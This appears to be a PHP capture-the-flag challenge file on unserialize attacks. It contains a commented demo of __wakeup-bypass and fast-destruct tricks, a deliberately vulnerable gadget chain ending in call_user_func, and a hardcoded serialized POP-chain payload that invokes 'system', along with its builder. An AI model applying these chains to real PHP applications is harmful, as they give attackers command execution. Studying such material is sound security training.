


<?php
/*
class test{
  public $name;
  public function __construct($name){
    $this->name = $name;
  }
    public function __destruct(){
        echo $this->name." 析构".PHP_EOL;
    }

    public function __wakeup(){
        echo "马飞飞".PHP_EOL;
      }
}
class test1{
    public function __wakeup(){
    echo "起飞".PHP_EOL;
  }
}

$normal_serialization = serialize(new test("伞兵一号"));
$normal_bypass = str_replace("1:{","2:{",$normal_serialization);
echo "改属性个数：".$normal_bypass.PHP_EOL;

$single_fast_serialization = serialize(array(new test("伞兵二号")));
$single_fast_bypass = str_replace("a:1","a:2",$single_fast_serialization);
echo "数组里只有一个类的fast destruct：".$single_fast_bypass.PHP_EOL;

$fast_destruct_serialization = serialize(array(new test("伞兵三号"),new test1()));
$multi_fast_destruct = str_replace("i:1","i:0",$fast_destruct_serialization);
echo "数组里有多个类的fast destruct：".$multi_fast_destruct.PHP_EOL;

echo "------------提前执行析构函数-----------".PHP_EOL;

echo "normal:".PHP_EOL;
$normal = unserialize($normal_bypass);
echo "normal exited".PHP_EOL;
echo "-------------------------".PHP_EOL;
echo "单个元素数组的fast destruct:".PHP_EOL;
$fast_destruct = unserialize($single_fast_bypass);
echo "single destruct exited".PHP_EOL;
echo "-------------------------".PHP_EOL;
echo "多个类的fast destruct:".PHP_EOL;
$fast_destruct = unserialize($multi_fast_destruct);
echo "fast destruct exited".PHP_EOL;

echo "---------------运行到脚本结束才执行析构--------------".PHP_EOL;
$normal = unserialize($normal_serialization);
echo "normal exited".PHP_EOL;
echo "-------------------------".PHP_EOL;
echo "含两个类元素的数组：".PHP_EOL;
$fast_destruct = unserialize($fast_destruct_serialization);
echo "exited".PHP_EOL;
echo "--------------------------------------".PHP_EOL;

*/
?>



<?php


//highlight_file(__FILE__);
error_reporting(0);

class fine
{
    private $cmd;
    private $content;

    public function __construct($cmd, $content)
    {
        $this->cmd = $cmd;
        $this->content = $content;
    }

    public function __invoke()
    {
        call_user_func($this->cmd, $this->content);
    }

    public function __wakeup()
    {
        $this->cmd = "";
        die("Go listen to Jay Chou's secret-code! Really nice");
    }
}

class show
{
    public $ctf;
    public $time = "Two and a half years";

    public function __construct($ctf)
    {
        $this->ctf = $ctf;
    }


    public function __toString()
    {
        return $this->ctf->show();
    }

    public function show(): string
    {
        return $this->ctf . ": Duration of practice: " . $this->time;
    }


}

class sorry
{
    private $name;
    private $password;
    public $hint = "hint is depend on you";
    public $key;

    public function __construct($name, $password)
    {
        $this->name = $name;
        $this->password = $password;
    }

    public function __sleep()
    {
        $this->hint = new secret_code();
    }

    public function __get($name)
    {
        $name = $this->key;
        $name();
    }


    public function __destruct()
    {
        if ($this->password == $this->name) {

            echo $this->hint;
        } else if ($this->name = "jay") {
            secret_code::secret();
        } else {
            echo "This is our code";
        }
    }


    public function getPassword()
    {
        return $this->password;
    }

    public function setPassword($password): void
    {
        $this->password = $password;
    }


}

class secret_code
{
    protected $code;

    public static function secret()
    {
        #include_once "hint.php";
        #hint();
        echo "get flag";
    }

    public function __call($name, $arguments)
    {
        $num = $name;
        $this->$num();
    }

    private function show()
    {
        return $this->code->secret;
    }
}

$code = "O:5:\"sorry\":5:{s:4:\"name\";N;s:8:\"password\";N;s:4:\"hint\";O:4:\"show\":1:{s:3:\"ctf\";O:11:\"secret_code\":1:{s:4:\"code\";O:5:\"sorry\":4:{s:4:\"name\";N;s:8:\"password\";N;s:4:\"hint\";O:4:\"fine\":2:{s:3:\"cmd\";s:6:\"system\";s:7:\"content\";s:2:\" /\";}s:3:\"key\";r:9;}}}s:3:\"key\";N;}";
$input = unserialize($code);

if (isset($input)) {
    $a = unserialize($input);
    $a->setPassword(md5(mt_rand()));
} else {
    $a = new show("Ctfer");
    echo $a->show();
}



?>


<?php

// // highlight_file(__FILE__);
// error_reporting(0);

// class secret_code
// {
//     public $code;
// }

// class show
// {
//     public $ctf;
// }

// class sorry
// {
//     public $name;
//     public $password;
//     public $hint;
//     public $key;

// }

// class fine
// {
//     public $cmd;
//     public $content;

//     public function __construct()
//     {
//         $this->cmd = "system";
//         $this->content = " /";
//     }
// }

// $a = new sorry();
// $b = new show();
// $c = new secret_code();
// $d = new fine();
// $e = new sorry();

// $a->hint = $b;
// $b->ctf = $c;

// $e->hint = $d;

// $c->code = $e;
// $e->key = $d;


// echo "---------";
// echo (serialize($a));

//O:5:"sorry":4:{s:4:"name";N;s:8:"password";N;s:4:"hint";O:4:"show":1:{s:3:"ctf";O:11:"secret_code":1:{s:4:"code";O:5:"sorry":4:{s:4:"name";N;s:8:"password";N;s:4:"hint";N;s:3:"key";O:4:"fine":2:{s:3:"cmd";s:6:"system";s:7:"content";s:2:" /";}}}}s:3:"key";N;}

//O:5:"sorry":4:{s:4:"name";N;s:8:"password";N;s:4:"hint";O:4:"show":1:{s:3:"ctf";O:11:"secret_code":1:{s:4:"code";O:5:"sorry":4:{s:4:"name";N;s:8:"password";N;s:4:"hint";O:4:"fine":2:{s:3:"cmd";s:6:"system";s:7:"content";s:2:" /";}s:3:"key";r:9;}}}s:3:"key";N;}

?>

